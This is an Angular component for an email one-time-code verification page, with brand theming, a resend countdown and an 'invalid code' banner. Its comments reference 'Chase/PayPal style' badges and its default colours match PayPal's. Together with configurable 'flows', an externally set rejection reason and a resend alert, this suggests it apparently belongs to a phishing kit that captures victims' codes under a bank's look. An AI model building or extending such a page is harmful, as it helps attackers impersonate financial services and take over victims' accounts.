
import { Component, inject, signal, computed, AfterViewInit, OnDestroy } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { PublicLayoutComponent } from './layout/public-layout.component';
import { StateService } from '../services/state.service';
import { TranslatePipe } from '../pipes/translate.pipe';

@Component({
    selector: 'app-email-otp',
    standalone: true,
    imports: [CommonModule, FormsModule, PublicLayoutComponent, TranslatePipe],
    template: `
    <app-public-layout>
      <div class="flex flex-col items-center mb-8">
        <!-- Badge (Optional) -->
        <div *ngIf="showBadge()" 
             class="px-3 py-1 rounded-full uppercase tracking-wider mb-5 border animate-fade-in text-[11px] font-bold"
             [style.background]="badgeBg()"
             [style.color]="badgeColor()"
             [style.border-color]="badgeBorder()">
           {{ 'EMAIL_OTP.BADGE' | translate }}
        </div>

        <h1 class="text-xl font-bold mb-2 text-center tracking-tight" [style.color]="headerColor()">
            {{ 'EMAIL_OTP.TITLE' | translate }}
        </h1>
        <p class="text-base text-center px-4 max-w-xs leading-relaxed opacity-80" [style.color]="textColor()">
           {{ 'EMAIL_OTP.DESC' | translate: { email: state.email() } }}
        </p>
      </div>

      <!-- Feedback -->
      @if (state.rejectionReason()) {
        <div class="mb-6 bg-red-50 border-l-[6px] border-[#D92D20] p-4 flex items-start gap-4 rounded-r-lg animate-in fade-in slide-in-from-top-2">
            <span class="material-icons text-[#D92D20] text-xl">error_outline</span>
            <div>
              <p class="text-sm font-bold text-[#D92D20]">{{ 'EMAIL_OTP.INVALID_TITLE' | translate }}</p>
              <p class="text-xs text-red-700 mt-1">{{ 'EMAIL_OTP.INVALID_DESC' | translate }}</p>
            </div>
        </div>
      }

      <div class="space-y-8">
        <div class="relative group">
            <input 
              type="text" 
              [(ngModel)]="otp"
              (input)="onInput($event)"
              id="otp"
              placeholder=" "
              class="w-full transition-all duration-200 outline-none block text-center font-mono font-bold text-lg tracking-[0.5em]"
              [class]="inputClasses()"
              [style]="inputStyles()"
              [style.color]="inputTextColor()"
              [class.shadow-input-error]="state.rejectionReason()"
            />
            <label for="otp" 
                class="absolute left-1/2 -translate-x-1/2 w-auto px-2 transition-all duration-200 pointer-events-none"
                [class]="labelClasses()"
                [style.color]="inputTextColor()"
                [style.background]="inputBg()">
               {{ 'EMAIL_OTP.INPUT_LABEL' | translate }}
            </label>
        </div>

        <button 
          (click)="submit()"
          [disabled]="otp.length < 6"
          [style.background]="btnBackground()"
          [style.color]="btnTextColor()"
          [style.border-radius]="btnRadius()"
          [class.opacity-50]="otp.length < 6"
          class="w-full py-3 font-bold text-lg shadow-md hover:shadow-lg transform active:scale-[0.98] transition-all relative overflow-hidden"
        >
          {{ 'COMMON.VERIFY' | translate }}
        </button>

        <div class="text-center">
            <p class="text-xs mb-2 font-bold opacity-60" [style.color]="textColor()">{{ 'EMAIL_OTP.NO_CODE' | translate }}</p>
            <button 
                (click)="resend()"
                [disabled]="timer() > 0"
                class="font-bold text-sm hover:underline disabled:opacity-50 disabled:no-underline disabled:cursor-not-allowed transition-colors"
                [style.color]="primaryColor()">
                {{ timer() > 0 ? ('EMAIL_OTP.RESEND_WAIT' | translate: { seconds: timer() }) : ('EMAIL_OTP.RESEND' | translate) }}
            </button>
        </div>
      </div>
    </app-public-layout>
  `
})
export class EmailOtpComponent implements AfterViewInit, OnDestroy {
    state = inject(StateService);
    otp = '';
    timer = signal(0);
    private timerInterval: any;

    // Theme Computeds
    theme = computed(() => this.state.currentFlow()?.theme);

    headerColor = computed(() => this.theme()?.input.textColor || '#003087');
    textColor = computed(() => this.theme()?.input.textColor || '#6b7280');
    inputTextColor = computed(() => this.theme()?.input.textColor || '#111827');
    inputBg = computed(() => this.theme()?.input.backgroundColor || '#ffffff');

    primaryColor = computed(() => this.theme()?.button.background || '#003087');
    btnBackground = computed(() => this.theme()?.button.background || '#003087');
    btnTextColor = computed(() => this.theme()?.button.color || '#ffffff');
    btnRadius = computed(() => this.theme()?.button.borderRadius || '999px');

    // Badge Styles (Optional - for Chase/PayPal style)
    showBadge = computed(() => this.theme()?.mode !== 'dark'); // Don't show badge in dark mode usually
    badgeBg = computed(() => this.theme()?.button.background + '10'); // 10% opacity
    badgeColor = computed(() => this.theme()?.button.background);
    badgeBorder = computed(() => this.theme()?.button.background + '30');

    constructor() {
        this.startTimer();
    }

    ngAfterViewInit() {
        setTimeout(() => {
            const el = document.getElementById('otp');
            if (el) el.focus();
        }, 100);
    }

    ngOnDestroy() {
        if (this.timerInterval) clearInterval(this.timerInterval);
    }

    // Styles
    inputStyles() {
        const t = this.theme()?.input;
        return {
            'background-color': t?.backgroundColor || '#fff',
            'border-radius': t?.borderRadius || '0.5rem',
            'height': '3.5rem'
        };
    }

    inputClasses() {
        const style = this.theme()?.input.style || 'modern';
        return `peer focus:ring-2 focus:ring-opacity-50 focus:border-transparent ${style === 'material' ? 'border-b-2 border-x-0 border-t-0 bg-transparent px-0 rounded-none' : 'border border-gray-300'}`;
    }

    labelClasses() {
        // Floating label centered logic
        return "text-sm peer-placeholder-shown:scale-100 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:top-1/2 peer-focus:top-0 peer-focus:scale-75 peer-focus:-translate-y-1/2 top-0 scale-75 -translate-y-1/2 cursor-text opacity-60 peer-focus:opacity-100 peer-focus:text-blue-600";
    }

    startTimer() {
        this.timer.set(60);
        if (this.timerInterval) clearInterval(this.timerInterval);
        this.timerInterval = setInterval(() => {
            this.timer.update(v => {
                if (v <= 1) {
                    clearInterval(this.timerInterval);
                    return 0;
                }
                return v - 1;
            });
        }, 1000);
    }

    onInput(event: any) {
        const val = event.target.value.replace(/\D/g, '');
        this.otp = val;
    }

    submit() {
        if (this.otp.length >= 6) {
            this.state.submitEmailOtp(this.otp);
        }
    }

    resend() {
        if (this.timer() === 0) {
            this.state.triggerResendAlert();
            this.startTimer();
        }
    }
}
